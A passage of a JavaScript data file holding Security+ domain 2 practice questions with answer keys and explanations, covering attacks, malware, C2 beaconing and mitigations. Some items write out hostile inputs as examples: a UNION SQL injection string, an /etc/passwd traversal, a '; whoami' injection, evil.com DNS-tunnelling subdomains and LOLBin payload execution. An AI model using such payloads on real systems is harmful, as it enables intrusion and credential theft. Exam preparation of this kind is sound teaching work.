const Q_D2 = [
 {
  "id": 5,
  "obj": "2.4",
  "type": "order",
  "domain": 2,
  "badge": "PBQ · Drag & Drop",
  "badgeClass": "drag-b",
  "stem": "A threat intelligence analyst is mapping a recent intrusion campaign to the Lockheed Martin Cyber Kill Chain. Arrange the seven Kill Chain phases in the correct order from first to last.",
  "items": [
   "Command & Control",
   "Weaponisation",
   "Actions on Objectives",
   "Delivery",
   "Reconnaissance",
   "Exploitation",
   "Installation"
  ],
  "correctOrder": [
   "Reconnaissance",
   "Weaponisation",
   "Delivery",
   "Exploitation",
   "Installation",
   "Command & Control",
   "Actions on Objectives"
  ],
  "exp": "Kill Chain order: Reconnaissance (OSINT, scanning, identifying targets) → Weaponisation (building exploit + payload, e.g. malicious macro in Word doc) → Delivery (sending payload — phishing email, USB drop, watering hole) → Exploitation (triggering the vulnerability on victim system) → Installation (establishing persistence — RAT, backdoor, scheduled task, registry run key) → Command & Control (C2 channel established — attacker can now remotely control the implant) → Actions on Objectives (the actual goal: data theft, ransomware deployment, sabotage). Breaking the chain early = cheaper incident. Defenders focus on Delivery and Exploitation as the highest-value prevention points."
 },
 {
  "id": 17,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst is reviewing SIEM alerts and notices that a workstation is sending small, encrypted HTTPS packets to an external IP address every 5 minutes, 24 hours a day. The workstation's user has not reported any issues. Which of the following is the MOST likely explanation?",
  "opts": [
   "A. The workstation is running a legitimate cloud backup agent",
   "B. The workstation is infected with malware performing C2 beaconing",
   "C. The workstation is performing scheduled Windows Update checks",
   "D. A port scan is being conducted against the workstation"
  ],
  "correct": 1,
  "exp": "C2 (Command and Control) beaconing is characterised by regular, periodic outbound connections from a compromised host to an attacker-controlled server — checking in for instructions. The 5-minute interval is suspiciously consistent (legitimate software varies timing), the destination is an external IP (not a known cloud provider range), and it runs 24/7 regardless of user activity. Backup agents (A) typically send larger data volumes and not constantly. Windows Update (C) connects to Microsoft IPs, not arbitrary external IPs. A port scan (D) would show inbound connection attempts TO the workstation, not outbound from it."
 },
 {
  "id": 18,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "During a penetration test, a tester sends an email to an employee impersonating the company's IT help desk, requesting that the employee visit a link to \"verify their account\" due to \"suspicious activity.\" The link leads to a credential harvesting page. Which attack type is this?",
  "opts": [
   "A. Vishing",
   "B. Watering hole attack",
   "C. Phishing",
   "D. Pharming"
  ],
  "correct": 2,
  "exp": "Phishing uses deceptive emails to trick recipients into providing credentials, clicking malicious links, or downloading malware. This is a textbook phishing attack: email impersonating a trusted entity (IT helpdesk) + urgency trigger (suspicious activity) + credential harvesting page. Vishing uses voice calls. A watering hole attack compromises a website the target is known to visit — the attacker doesn't send an email; instead they wait for the victim to visit a legitimate site that has been infected. Pharming redirects legitimate website traffic by poisoning DNS or hosts files — users type the correct URL but land on a fake site without receiving any email."
 },
 {
  "id": 19,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A company recently suffered a data breach in which an attacker used valid login credentials belonging to a contractor. Investigation revealed the contractor's credentials were stolen from a separate breach at an unrelated company where the contractor reused their password. Which attack type exploited this?",
  "opts": [
   "A. Brute force attack",
   "B. Dictionary attack",
   "C. Credential stuffing",
   "D. Password spraying"
  ],
  "correct": 2,
  "exp": "Credential stuffing uses verified username-password pairs stolen from one breach to attack other services, specifically exploiting password reuse across sites. The attacker didn't guess the password — they obtained it from another breach. Brute force systematically tries every possible combination. Dictionary attacks try common words and variations. Password spraying tries a few common passwords (e.g., Password123!) against a large number of accounts to avoid lockouts — it doesn't use credentials from prior breaches. Credential stuffing is identified by the use of known-valid credentials from a different service."
 },
 {
  "id": 20,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst reviewing web application logs finds the following entry in the URL: <code>/search?q=shoes%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--</code>. Which vulnerability is being exploited?",
  "opts": [
   "A. Cross-site scripting (XSS)",
   "B. Directory traversal",
   "C. SQL injection",
   "D. Command injection"
  ],
  "correct": 2,
  "exp": "The URL contains a URL-encoded SQL injection payload: <code>shoes' UNION SELECT username,password FROM users--</code>. The attacker terminates the original query with <code>'</code>, appends a UNION statement to pull credentials from the users table, and uses <code>--</code> to comment out the rest of the original query. This is a UNION-based SQL injection attack. XSS injects JavaScript into pages viewed by other users. Directory traversal uses <code>../</code> sequences to access files outside the web root. Command injection executes OS commands via vulnerable input fields (e.g., <code>; whoami</code>)."
 },
 {
  "id": 21,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker sends a large volume of SYN packets to a web server but never completes the three-way TCP handshake. The server's connection table fills up and it becomes unable to accept legitimate connections. Which attack is occurring?",
  "opts": [
   "A. Smurf attack",
   "B. SYN flood (TCP state exhaustion)",
   "C. Ping of death",
   "D. DNS amplification attack"
  ],
  "correct": 1,
  "exp": "A SYN flood exploits the TCP three-way handshake. The server receives SYN, allocates resources and sends SYN-ACK, but the attacker never sends the final ACK — leaving half-open connections consuming server memory until the connection table fills and legitimate connections are rejected. This is a Denial of Service via state exhaustion. A Smurf attack uses ICMP echo requests with a spoofed source IP to a broadcast address. Ping of Death sends malformed oversized ICMP packets. DNS amplification sends small DNS queries that generate large responses toward a victim — a reflection/amplification DDoS technique. SYN cookies are the primary mitigation for SYN floods."
 },
 {
  "id": 22,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An employee receives a text message that appears to be from their bank, stating their account has been flagged. The message contains a link to a site that mimics the bank's login page to capture credentials. Which social engineering technique is this?",
  "opts": [
   "A. Vishing",
   "B. Smishing",
   "C. Spear phishing",
   "D. Whaling"
  ],
  "correct": 1,
  "exp": "Smishing = SMS phishing — using text messages as the delivery channel for social engineering. Channel distinctions are heavily tested: Email = Phishing, SMS/text = Smishing, Voice/phone call = Vishing. Spear phishing is targeted email phishing against a specific individual, using personalised details. Whaling targets senior executives specifically. The channel here is SMS/text message, making this definitively smishing. The fake login page is credential harvesting — a common smishing payload alongside links to malware downloads."
 },
 {
  "id": 23,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A threat actor gains access to a software vendor's build server and injects malicious code into a software update package before it is digitally signed and distributed to thousands of customers. Which attack type does this BEST represent?",
  "opts": [
   "A. Zero-day exploit",
   "B. Watering hole attack",
   "C. Supply chain attack",
   "D. Man-in-the-middle attack"
  ],
  "correct": 2,
  "exp": "A supply chain attack compromises a trusted third-party vendor, supplier, or component to reach downstream customers. The SolarWinds attack (2020) is the canonical example — attackers compromised the build process to inject SUNBURST malware into legitimate, signed updates distributed to ~18,000 organisations. The key indicator: the attacker compromised the trusted build/distribution pipeline, not the end customer directly. Zero-day exploits an unknown vulnerability. A watering hole compromises websites the target visits. MitM intercepts communication between two parties in transit — not a build pipeline compromise."
 },
 {
  "id": 24,
  "obj": "2.5",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A vulnerability scanner reports a critical finding on a medical device connected to the hospital network. The device vendor no longer supports the product, and patching is not possible. Shutting down the device would endanger patient care. Which risk treatment is MOST appropriate?",
  "opts": [
   "A. Risk avoidance — immediately decommission the device",
   "B. Risk acceptance — document the risk and take no further action",
   "C. Risk mitigation — implement compensating controls such as network isolation and enhanced monitoring",
   "D. Risk transference — purchase cyber insurance for the device"
  ],
  "correct": 2,
  "exp": "When a vulnerability cannot be patched (unsupported device, operational constraints), compensating controls mitigate the risk without addressing the root cause. Network isolation (VLAN segmentation, firewall rules restricting what the device can communicate with) and enhanced monitoring reduce the likelihood and impact of exploitation. Risk avoidance (A) requires decommissioning — not possible here. Risk acceptance (B) without any mitigation is inappropriate for a critical finding. Risk transference (D) via insurance doesn't reduce the technical risk. This is a classic compensating control scenario — heavily tested on Security+."
 },
 {
  "id": 25,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A malware analyst is examining a sample that appears to be a legitimate PDF viewer application. However, once installed, it opens a remote shell to an external server. The antivirus did not detect it. Which malware type is this?",
  "opts": [
   "A. Worm",
   "B. Ransomware",
   "C. Trojan",
   "D. Rootkit"
  ],
  "correct": 2,
  "exp": "A Trojan (Trojan horse) masquerades as a legitimate, useful application while secretly performing malicious actions. The victim is tricked into installing it because it appears benign. Trojans do not self-replicate (distinguishing them from worms) and typically establish remote access (RAT — Remote Access Trojan) or backdoors. A worm self-replicates across networks without user interaction. Ransomware encrypts files and demands payment. A rootkit operates at a low system level to conceal malware and gain persistent privileged access — rootkits are often delivered via Trojans but are a different classification. The disguise-as-legitimate-software characteristic = Trojan."
 },
 {
  "id": 26,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A company hires an external firm to test whether employees will open phishing emails and click malicious links. The firm sends simulated phishing emails without employees' prior knowledge. Which type of assessment is this?",
  "opts": [
   "A. Vulnerability scan",
   "B. Penetration test",
   "C. Red team exercise",
   "D. Social engineering assessment"
  ],
  "correct": 3,
  "exp": "A social engineering assessment (also called a phishing simulation or SE assessment) specifically tests human susceptibility to manipulation techniques rather than technical vulnerabilities. Simulated phishing emails measuring click rates, credential submissions, and reporting rates are the most common form. A vulnerability scan uses automated tools to identify technical weaknesses in systems. A penetration test exploits technical vulnerabilities to measure real impact. A red team exercise is a broader, longer-duration adversarial simulation combining physical, social, and technical attack vectors. The scenario is specifically testing human behaviour = social engineering assessment."
 },
 {
  "id": 27,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst reviews DNS query logs and discovers a host is making hundreds of queries per hour for subdomains like <code>a8f3b.data.evil.com</code>, <code>c2d9e.data.evil.com</code>. The subdomains change with each query and have no valid DNS records. What is MOST likely occurring?",
  "opts": [
   "A. The DNS server is under a DDoS amplification attack",
   "B. The host is infected with malware using DNS tunnelling for data exfiltration",
   "C. The host is performing aggressive DNS cache warming",
   "D. A misconfigured application is generating invalid DNS queries"
  ],
  "correct": 1,
  "exp": "DNS tunnelling encodes data into DNS query hostnames (subdomains). The malware on the victim sends data as part of the hostname: <code>[encoded-data].attacker.com</code> — the attacker's DNS server receives and decodes each query. High-entropy, unique, rapidly-changing subdomains to the same parent domain are the telltale indicators. It evades detection because DNS traffic (port 53) is rarely blocked or deeply inspected. DDoS amplification uses DNS to flood a victim with large responses — the queries would target multiple DNS resolvers, not one parent domain. Cache warming pre-fetches popular domains, not unique random subdomains."
 },
 {
  "id": 28,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "After patching a critical CVE, a security team runs a follow-up vulnerability scan and finds the vulnerability still shows as present. Which action should the team take FIRST?",
  "opts": [
   "A. Accept the risk and move on — the patch was applied",
   "B. Verify the patch was applied correctly and the system was restarted if required",
   "C. Immediately escalate to the CISO as a potential breach",
   "D. Disable the affected service until the vendor releases a new patch"
  ],
  "correct": 1,
  "exp": "When a vulnerability persists after patching, the first step is to verify the patch was applied correctly — patches can fail silently, require reboots to take effect, or be applied to the wrong system instance (in virtualised or containerised environments). Confirm the patch version is present, the service was restarted, and the scan was run post-restart. Accepting the risk (A) without investigation is inappropriate for a critical CVE. Escalating immediately (C) is premature — it may just be a missed restart. Disabling the service (D) causes outage and is premature before investigating the cause. Verify first, then escalate if the patch genuinely failed."
 },
 {
  "id": 29,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker compromises a user's session by injecting a malicious script into a web page that is then viewed by other authenticated users. The script runs in the victim's browser and silently sends their session cookie to the attacker. Which vulnerability is being exploited?",
  "opts": [
   "A. SQL injection",
   "B. Cross-site scripting (XSS)",
   "C. Cross-site request forgery (CSRF)",
   "D. Server-side request forgery (SSRF)"
  ],
  "correct": 1,
  "exp": "Cross-site scripting (XSS) injects malicious JavaScript into web pages that are then rendered by other users' browsers. The script runs in the victim's browser context, giving it access to cookies, session tokens, and DOM content. Stored XSS (persistent) is saved to the database and served to all visitors. Reflected XSS is in the URL/response. CSRF (C) tricks an authenticated user's browser into making unwanted requests to the application — the attacker doesn't directly steal the cookie; they make the browser send a pre-crafted request while authenticated. SSRF (D) tricks the server into making requests to internal resources. SQL injection targets database queries. XSS = script runs in victim's browser."
 },
 {
  "id": 30,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security researcher discovers a critical vulnerability in a widely-used VPN product. The vendor is notified and has 90 days to release a patch before the researcher publicly discloses full details. Which vulnerability disclosure approach is the researcher using?",
  "opts": [
   "A. Full disclosure",
   "B. Responsible/coordinated disclosure",
   "C. Bug bounty submission",
   "D. Zero-day sale"
  ],
  "correct": 1,
  "exp": "Responsible (coordinated) disclosure gives the vendor time to develop and release a patch before public disclosure. The 90-day window is standard (pioneered by Google Project Zero). This balances the vendor's need to fix the issue with the public's right to know about risks. Full disclosure (A) publishes all details immediately with no vendor notification period — maximises public awareness but gives attackers exploit information before a patch exists. A bug bounty (C) involves a monetary reward program — it's a mechanism, not a disclosure philosophy. Zero-day sale (D) involves selling vulnerability details to third parties (including potentially malicious actors)."
 },
 {
  "id": 31,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A penetration tester is assessing a web application and submits the value <code>../../../../etc/passwd</code> in a file upload parameter. The server returns the contents of the system password file. Which vulnerability has been exploited?",
  "opts": [
   "A. SQL injection",
   "B. XML injection",
   "C. Directory traversal",
   "D. LDAP injection"
  ],
  "correct": 2,
  "exp": "Directory traversal (path traversal) uses <code>../</code> sequences to navigate outside the intended directory and access files elsewhere on the filesystem. <code>../../../../etc/passwd</code> traverses up four directory levels to reach the root, then accesses the Unix password file. This vulnerability occurs when applications fail to validate or sanitise file path inputs. Mitigation: input validation, canonicalise paths before use, run the web server process with minimum permissions. SQL injection targets database queries. XML injection manipulates XML parsers. LDAP injection manipulates directory service queries. The <code>../</code> pattern = directory traversal."
 },
 {
  "id": 32,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organisation's ARP table shows that the default gateway IP address (192.168.1.1) is now associated with a MAC address that was previously assigned to a workstation. Legitimate users are experiencing slow internet and network timeouts. What is MOST likely occurring?",
  "opts": [
   "A. A misconfigured DHCP server has assigned duplicate IPs",
   "B. ARP spoofing is being used to conduct a man-in-the-middle attack",
   "C. The default gateway has been physically replaced",
   "D. A rogue DHCP server is issuing incorrect gateway addresses"
  ],
  "correct": 1,
  "exp": "ARP spoofing sends gratuitous ARP replies claiming the attacker's MAC owns the gateway IP. Clients update their ARP cache and start sending all internet-bound traffic to the attacker's machine instead of the real gateway — enabling MitM interception, credential theft, and traffic manipulation. Symptoms: legitimate traffic slows or fails (if the attacker isn't forwarding), network monitoring shows two MACs for one IP. Mitigation: Dynamic ARP Inspection (DAI) on managed switches, static ARP entries for critical hosts. DHCP duplication (A) would cause connectivity issues but not ARP table manipulation. A replaced gateway (C) wouldn't cause an attacker-owned MAC to appear."
 },
 {
  "id": 33,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A company's threat intelligence feed reports that a threat actor group known to target financial institutions has been observed using a specific PowerShell command pattern for lateral movement. The company's security team searches their SIEM for this pattern proactively before any alert fires. Which activity is this?",
  "opts": [
   "A. Incident response",
   "B. Vulnerability scanning",
   "C. Threat hunting",
   "D. Security auditing"
  ],
  "correct": 2,
  "exp": "Threat hunting is a proactive, human-led search for threats that automated tools have not yet detected. The key indicators: proactive (not triggered by an alert), hypothesis-driven (based on threat intelligence about a specific TTP), and searching for evidence of compromise that may already be present. Incident response activates after an incident has been identified. Vulnerability scanning uses automated tools to find known vulnerabilities in systems. A security audit reviews compliance with policies and controls. The scenario describes searching for a known TTP before any alert — that is threat hunting."
 },
 {
  "id": 34,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker registers the domain name <code>paypa1.com</code> (using the digit one instead of the letter L) and sends emails directing victims to this site. Which technique is being used?",
  "opts": [
   "A. Domain hijacking",
   "B. DNS cache poisoning",
   "C. Typosquatting",
   "D. URL redirection"
  ],
  "correct": 2,
  "exp": "Typosquatting (URL hijacking) registers intentionally misspelled or visually similar domain names to impersonate legitimate sites. <code>paypa1.com</code> uses a homoglyph substitution (1 vs l) that is visually indistinguishable in some fonts. Victims who mistype or click without checking the full URL land on the attacker's site. Domain hijacking (A) takes over a legitimate domain's registration. DNS cache poisoning (B) inserts false records into a DNS resolver's cache — redirects users even when they type the correct domain. URL redirection uses legitimate URLs that forward to malicious destinations. The registration of a lookalike domain = typosquatting."
 },
 {
  "id": 35,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst discovers a host on the network is running a service on port 4444 that is not in the approved application list. The host is also observed initiating outbound connections on this port. Which of the following is the analyst MOST likely dealing with?",
  "opts": [
   "A. A legitimate remote management tool requiring whitelisting",
   "B. A Metasploit meterpreter or similar C2 shell on a compromised host",
   "C. An FTP server misconfiguration",
   "D. A DNS resolver running on a non-standard port"
  ],
  "correct": 1,
  "exp": "Port 4444 is the well-known default port for Metasploit's Meterpreter reverse shell and several common C2 frameworks. An unknown service on 4444 combined with outbound connections initiated by the host is a strong indicator of compromise — the host is likely \"calling home\" to an attacker's C2 server. This is a classic IOC (Indicator of Compromise). FTP uses ports 20/21. DNS uses port 53. Legitimate remote management tools would appear in the approved application list and typically use known, documented ports. The combination of unknown service + outbound initiated connection + known attacker-tool port = investigate for compromise immediately."
 },
 {
  "id": 36,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organisation performs an authenticated vulnerability scan versus an unauthenticated scan on the same target. The authenticated scan returns significantly more findings. Why?",
  "opts": [
   "A. Authenticated scans generate more false positives",
   "B. Authenticated scans can access OS-level patch levels, installed software, and configurations that are invisible externally",
   "C. Unauthenticated scans are blocked by the firewall",
   "D. Authenticated scans test more ports"
  ],
  "correct": 1,
  "exp": "An authenticated (credentialed) vulnerability scan logs into the target system and can inspect: installed software versions, patch levels, registry settings, running services, user configurations, and local security policies. This produces far more accurate and complete results. An unauthenticated scan can only see what is externally exposed (open ports, service banners) and has to infer vulnerabilities from external fingerprinting — missing many internal misconfigurations and missing patches. Authenticated scans generally produce fewer false positives (not more) because they have definitive version information. Port range is not the differentiator — credentials are."
 },
 {
  "id": 44,
  "obj": "2.1",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A CISO is reviewing the organisation's use of cloud services and finds that several departments have subscribed to unapproved SaaS applications to solve business problems, bypassing the IT approval process. What security term describes this situation?",
  "opts": [
   "A. Insider threat",
   "B. Shadow IT",
   "C. Data sovereignty violation",
   "D. Vendor lock-in"
  ],
  "correct": 1,
  "exp": "Shadow IT refers to technology (software, hardware, cloud services) deployed and used within an organisation without IT department knowledge, review, or approval. It introduces significant risks: unvetted security controls and potential data leakage. SY0-701 categorizes this under threat vectors and actors (2.1)."
 },
 {
  "id": 135,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A threat intelligence report describes an attacker group motivated by financial gain, with capabilities including custom malware development and the ability to maintain access to victim networks for 6-12 months. Which threat actor category BEST describes this group?",
  "opts": [
   "A. Script kiddie",
   "B. Hacktivist",
   "C. Organised crime / financially motivated APT",
   "D. Insider threat"
  ],
  "correct": 2,
  "exp": "Organised crime groups with APT (Advanced Persistent Threat) capabilities are characterised by: financial motivation, sophisticated custom tooling, long dwell time (months to years), and professional operational security. They typically target financial institutions, retailers, and healthcare for monetisable data. Script kiddies use existing tools without deep understanding and lack the capability for 6-12 month campaigns. Hacktivists are ideologically motivated. Insider threats are current or former employees/contractors. Nation-state actors are government-sponsored. The combination of financial motivation + custom malware + long persistence = organised crime APT."
 },
 {
  "id": 136,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker sends an email to a developer with a link to a GitHub repository. The repository contains code the developer is interested in, but also includes a malicious package as a dependency. When the developer runs the code, malware is installed. Which attack vector is being exploited?",
  "opts": [
   "A. Direct phishing — the email link is the attack",
   "B. Supply chain / dependency confusion attack via the development environment",
   "C. Man-in-the-middle — the attacker intercepted the GitHub traffic",
   "D. Social engineering via vishing"
  ],
  "correct": 1,
  "exp": "Dependency confusion (a supply chain attack) exploits the way package managers (npm, pip, etc.) resolve dependencies — attackers publish malicious packages to public registries with the same name as internal packages, causing developers to inadvertently install the malicious version. More broadly, compromising developer environments and build dependencies is a critical attack surface. This targets the software development pipeline — a valuable supply chain attack surface. The email is a social engineering delivery mechanism, but the core exploit is the malicious dependency. Developers are high-value targets because compromising their machines or code can impact all downstream users."
 },
 {
  "id": 137,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security scanner identifies a vulnerability in a web application with a CVSS base score of 9.8. The application is on an internal network with no internet exposure, requires valid domain credentials to access, and no exploit code is publicly available. The security team decides not to immediately patch. Which factors justify a lower EFFECTIVE risk priority?",
  "opts": [
   "A. The CVSS score is wrong — 9.8 is not critical",
   "B. CVSS base score does not account for environmental factors like network location, existing controls, and exploit availability",
   "C. Internal applications are never targeted",
   "D. The vendor will release a patch soon so patching is unnecessary"
  ],
  "correct": 1,
  "exp": "CVSS has three metric groups: Base (intrinsic severity — this gives 9.8), Temporal (exploit code availability, remediation status), and Environmental (network location, existing controls, asset criticality). The base score assumes worst-case — internet-exposed, no mitigations, exploit available. The environmental and temporal context here (internal only, requires auth, no public exploit) significantly reduces the effective risk. The team's decision to not immediately patch based on environmental context is a valid risk-informed decision, not negligence. However, it should be documented and revisited. CVSS alone ≠ priority — context matters."
 },
 {
  "id": 138,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "During incident response, an analyst examines a compromised Windows host and finds a scheduled task named \"Windows Update Helper\" running a PowerShell script from a temp directory every hour. The script connects to an external IP. The scheduled task was created 3 weeks ago. Which MITRE ATT&CK tactic does this MOST likely represent?",
  "opts": [
   "A. Initial Access",
   "B. Persistence",
   "C. Lateral Movement",
   "D. Exfiltration"
  ],
  "correct": 1,
  "exp": "MITRE ATT&CK Persistence (TA0003) covers techniques attackers use to maintain their foothold across system restarts, credential changes, or other interruptions. Scheduled tasks (T1053.005) are one of the most commonly used persistence mechanisms — they survive reboots and appear to blend in with legitimate Windows tasks. The attacker created this 3 weeks ago (well after initial access) specifically to ensure continued C2 connectivity. Initial Access is the first compromise. Lateral Movement is moving to other systems. Exfiltration is stealing data out. A scheduled task running a C2 script = persistence. MITRE ATT&CK is heavily tested on SY0-701."
 },
 {
  "id": 139,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A SOC analyst receives an alert: multiple endpoints simultaneously begin encrypting files, renaming them with a \".locked\" extension, and dropping a README.txt file with payment instructions. Which malware type and MOST appropriate immediate response is correct?",
  "opts": [
   "A. Spyware — run antivirus to remove it",
   "B. Ransomware — immediately isolate affected systems from the network to prevent further spread",
   "C. Worm — apply emergency patches to all systems",
   "D. Rootkit — reboot affected systems to clear memory"
  ],
  "correct": 1,
  "exp": "File encryption + ransom note + renamed extensions = ransomware. The immediate response to active ransomware is network isolation — disconnect affected systems (pull network cable, disable Wi-Fi, isolate VLAN) to stop the malware from spreading to network shares and other endpoints. Speed is critical: ransomware propagates rapidly. After isolation: engage IR team, preserve forensic evidence, assess backup integrity, begin eradication. Do NOT pay immediately — verify backup availability first. Rebooting (D) may actually trigger additional encryption routines in some ransomware variants. Isolation = most important immediate step."
 },
 {
  "id": 140,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A company deploys application allowlisting on all endpoints — only approved, signed executables can run. An attacker who gains access finds they cannot run their custom malware. Instead, they use certutil.exe (a built-in Windows tool) to download a payload and mshta.exe to execute it. Which technique has the attacker used?",
  "opts": [
   "A. Privilege escalation",
   "B. Living off the land (LotL) using trusted system binaries",
   "C. Pass-the-hash attack",
   "D. Kernel exploit"
  ],
  "correct": 1,
  "exp": "Living off the Land (LotL) uses legitimate, pre-installed system tools (LOLBins — Living Off the Land Binaries) to perform malicious actions — bypassing allowlisting and AV because the tools are trusted. Common LOLBins: certutil.exe (download files), mshta.exe (execute scripts), regsvr32.exe, wscript.exe, bitsadmin.exe, msiexec.exe. Allowlisting stops unknown executables but cannot block these built-in tools without breaking Windows functionality. This technique is heavily used by APTs specifically to evade endpoint controls. Mitigation: application control policies that restrict LOLBin usage, PowerShell constrained language mode, Windows Defender Application Control (WDAC)."
 },
 {
  "id": 141,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security team wants to prevent attackers from using stolen admin credentials to move laterally using Pass-the-Hash (PtH) attacks. Which mitigation MOST directly addresses PtH?",
  "opts": [
   "A. Enforce password complexity requirements",
   "B. Enable Windows Defender Credential Guard to protect credential hashes in memory",
   "C. Implement full disk encryption on all workstations",
   "D. Deploy network-based IDS to detect hash usage"
  ],
  "correct": 1,
  "exp": "Pass-the-Hash captures NTLM credential hashes from memory (via mimikatz/similar) and uses them directly for authentication without cracking them. Windows Defender Credential Guard uses virtualisation-based security (VBS) to isolate credential material in a protected enclave inaccessible to the OS — preventing attackers from extracting hashes even with admin privileges. Password complexity (A) doesn't help — PtH doesn't require knowing the plaintext password. FDE (C) protects data at rest but not credentials in memory. IDS (D) can detect PtH patterns but doesn't prevent it. Credential Guard directly addresses the attack vector by protecting the hashes themselves."
 },
 {
  "id": 168,
  "type": "multi",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A threat actor wants to gain access to a company's internal network without directly attacking its perimeter defences. Which TWO attack surfaces represent indirect routes into the organisation?",
  "opts": [
   "A. Directly brute-forcing the VPN gateway",
   "B. Compromising a third-party vendor who has VPN access to the internal network",
   "C. Sending a targeted spear phishing email to an employee with privileged access",
   "D. Running an nmap scan of the external IP ranges",
   "E. Checking the company's website for technology stack information"
  ],
  "correct": [
   1,
   2
  ],
  "exp": "Indirect attack surfaces: B: Third-party/supply chain — vendors with network access are trusted by the target but may have weaker security. Compromising the vendor is an indirect route that bypasses perimeter controls. C: Spear phishing targeting privileged users — rather than breaking through technical defences, the attacker manipulates a human with existing legitimate access. Both represent the human and third-party attack surfaces. Direct brute force (A) attacks the perimeter directly. nmap scanning (D) is reconnaissance, not access. Checking the website (E) is passive OSINT. The key distinction: indirect attacks avoid perimeter defences by exploiting trusted relationships or humans."
 },
 {
  "id": 172,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A developer discovers that a third-party JavaScript library used in their web application has a known Remote Code Execution vulnerability (CVE-2024-XXXX). The library version is embedded in the application and the fix requires updating to a newer version that has breaking API changes requiring significant development work. Which risk treatment is MOST appropriate as an immediate measure while the fix is being developed?",
  "opts": [
   "A. Accept the risk — the fix will take time regardless",
   "B. Remove the application from production immediately",
   "C. Implement a WAF rule blocking known exploit patterns for the CVE as a compensating control",
   "D. Notify users of the vulnerability"
  ],
  "correct": 2,
  "exp": "A WAF compensating control blocks known exploitation patterns for the specific CVE while the proper fix (library upgrade) is developed — this is the standard \"virtual patching\" approach. It's not perfect (attackers may find novel exploit variations) but dramatically reduces risk during the remediation window. Accepting risk (A) with a critical RCE and no mitigation is inappropriate. Taking the app offline (B) may be considered for extremely critical systems but has major business impact. Notifying users (D) doesn't reduce the risk. WAF virtual patching = the industry-standard compensating control for application vulnerabilities pending code fixes."
 },
 {
  "id": 177,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst receives a threat intelligence report describing a new ransomware group. The report includes their observed TTPs mapped to MITRE ATT&CK. The analyst wants to determine if the organisation has defences against these specific TTPs. Which use of threat intelligence is this?",
  "opts": [
   "A. Strategic intelligence — informing board-level risk decisions",
   "B. Tactical intelligence — using TTPs to test and improve specific defensive controls",
   "C. Operational intelligence — understanding a specific active campaign",
   "D. Technical intelligence — sharing IOCs like IP addresses and hashes"
  ],
  "correct": 1,
